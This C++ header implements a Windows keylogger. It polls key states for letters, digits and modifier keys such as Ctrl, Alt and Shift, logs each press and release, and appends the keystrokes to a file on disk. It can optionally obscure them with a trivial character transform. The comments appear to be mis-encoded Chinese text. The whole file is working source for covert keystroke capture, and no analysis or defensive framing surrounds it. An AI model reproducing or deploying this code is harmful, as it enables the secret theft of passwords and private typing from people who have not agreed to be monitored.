#pragma once

#include<fstream>
#include<cstdlib>
#include<cstdio>

bool Encrypte = true;					//���ܿ���



class JudgeLetter
{
public :
	static bool SwitcherFunType[14] ;												//���ܼ��Ĺ���״̬
	static int KeyBoardValue[14];
	static std::string KeyBoardName[14];											//���ܼ�����

	static char NormalChar();														//��ͨ��Сд��ĸ������,����������ַ�
	static void Test(std::string DocumentPath);
	static std::string FuncTypeLeftClose(int KeyNum);								//���ܼ�����պ�
	static std::string FuncTypeRightClose(int KeyNum);
	static void InsertIntoDocument(std::string Order,std::string DocumentPath);
};

bool JudgeLetter::SwitcherFunType[14] = { false };
int JudgeLetter::KeyBoardValue[14] = { VK_CAPITAL ,VK_RETURN ,VK_CONTROL ,VK_MENU ,VK_SHIFT ,
										 VK_TAB ,VK_LWIN ,VK_ESCAPE ,VK_SPACE ,VK_BACK ,
											VK_LEFT ,VK_RIGHT ,VK_UP ,VK_DOWN };

std::string JudgeLetter::KeyBoardName[14] = { "Caps","Enter","Ctrl","Alt","Shift",
											  "Tab","Win","Esc","Space","Back","Left",
												"Right","Up","Down" };


char JudgeLetter::NormalChar()			
{
	char InputChar;
	char LetterSet[26 + 10];
	int Index = 0;
	while (Index < 26 + 10)
	{
		if (Index < 26)LetterSet[Index++] = 'A'+Index;
		else LetterSet[Index++] = '0' + Index - 26;
	}

	for (int i = 0; i < 26+10 ; i++)
	{
		if ( (i<26)&& (::GetKeyState(LetterSet[i]) & 0x8000)  )
		{
			keybd_event(LetterSet[i], 0, KEYEVENTF_KEYUP, 0);//�ɿ�a��
			LetterSet[i] -= 'A' - 'a';

			return LetterSet[i];
		}
		else if ((i >= 26) && (::GetKeyState(LetterSet[i]) & 0x8000))
		{
			keybd_event(LetterSet[i], 0, KEYEVENTF_KEYUP, 0);
			return LetterSet[i];
		}
	}
	return NULL;
}


void JudgeLetter::Test(std::string DocumentPath)
{
	while (1)
	{
		char ch = NULL;

		//���ܼ���պ�
		std::string FunOrder=JudgeLetter::FuncTypeLeftClose(14);
		if (FunOrder != "")
		{
			std::cout << FunOrder;
			JudgeLetter::InsertIntoDocument(FunOrder, DocumentPath);
		}
		//���ܼ����ұպ�
		FunOrder = JudgeLetter::FuncTypeRightClose(14);
		if (FunOrder != "")
		{
			std::cout << FunOrder;
			JudgeLetter::InsertIntoDocument(FunOrder, DocumentPath);
		}


		//¼�������ַ�
		ch=JudgeLetter::NormalChar();
		if (ch != NULL)
		{
			std::cout << ch;
			FunOrder = ch;
			JudgeLetter::InsertIntoDocument(FunOrder, DocumentPath);
		}

	}
}

std::string JudgeLetter::FuncTypeLeftClose(int KeyNum)			//���ܼ�����պ�
{
	std::string Result="";
	int Test = 0;


	for (int i = 0; i < KeyNum; i++)
	{
		bool KeyState = (GetKeyState(JudgeLetter::KeyBoardValue[i]) & 0x8000);
		if( (JudgeLetter::SwitcherFunType[i] == false)&&KeyState==true	)
		{
			
			Test++;
			JudgeLetter::SwitcherFunType[i] = true;			
			Result+="fun["+ JudgeLetter::KeyBoardName[i]+",On]\n";
		}
	}
	return Result;
}

std::string JudgeLetter::FuncTypeRightClose(int keyNum)			//���ܼ����ұպ�
{
	std::string Result = "";
	int Test = 0;
	
	for (int i = keyNum - 1; i >= 0; i--)
	{
		bool KeyState = (GetKeyState(JudgeLetter::KeyBoardValue[i]) & 0x8000);
		
		if ((JudgeLetter::SwitcherFunType[i] == true) && KeyState == false)
		{
			Test++;

			JudgeLetter::SwitcherFunType[i] = false;
			Result += "fun[" + JudgeLetter::KeyBoardName[i] + ",Off]\n";
		}
	}
	return Result;
}

std::string Encryption(std::string str)
{
	for (std::string::iterator iter = str.begin(); iter != str.end(); iter++)
	{
		std::cout << (int)*iter;
		int Value = 128 - (int)*iter;
		*iter = (char)(Value);
		std::cout << " " << (int)*iter;
	}
	std::string TempStr = "";
	for (char iter : str)
	{
		char Value[10];
		_itoa_s(int(iter),Value, 10);
		TempStr += Value;
		TempStr += " ";
	}

	str = TempStr;

	return str;
}

void JudgeLetter::InsertIntoDocument(std::string order,std::string DocumentPath)
{
	if (Encrypte == true)
	{
		order = Encryption(order);
	}

	std::ofstream outdata;
	outdata.open(DocumentPath, std::ios::app);//ios::app��β��׷�ӵ���˼
	outdata << order;
	outdata.close();
	return ;
}